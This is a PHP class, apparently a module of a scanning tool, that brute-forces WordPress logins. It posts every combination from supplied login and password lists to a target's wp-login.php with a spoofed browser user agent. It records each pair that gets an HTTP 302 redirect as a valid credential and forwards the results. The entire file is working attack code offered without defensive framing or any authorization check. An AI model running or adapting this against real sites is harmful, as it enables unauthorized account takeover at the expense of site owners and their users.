<?php

/**
 * Created by PhpStorm.
 * User: Lalka
 * Date: 03.05.2016
 * Time: 16:03
 */
class Bruteforce extends Main
{


    function startScan($source)
    {
        $logins = $source['logins'];
        $passwords = $source['passwords'];

        //$result=array();
        print_r($logins);
        print_r($passwords);
        $ch = $this->ch;
        curl_setopt($ch, CURLOPT_URL, $this->target . "wp-login.php");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        //curl_setopt($ch, CURLINFO_HEADER_OUT, 1);
        //curl_setopt($ch, CURLOPT_NOBODY, 1);
        foreach ($logins as $login) {
            foreach ($passwords as $password) {
                //curl_setopt($ch,CURLOPT_POSTFIELDS,"log=$login&pwd=$password");
                $ss = "log=$login&pwd=$password&task=login";
                curl_setopt($ch, CURLOPT_POSTFIELDS, $ss);
                echo $ss, " ";
                curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE) . "\n";
                if ($httpcode == 302)
                    array_push($this->result[$this->scid], array("login" => $login, "password" => $password));

            }
        }

        $this->sendResults();
    }

}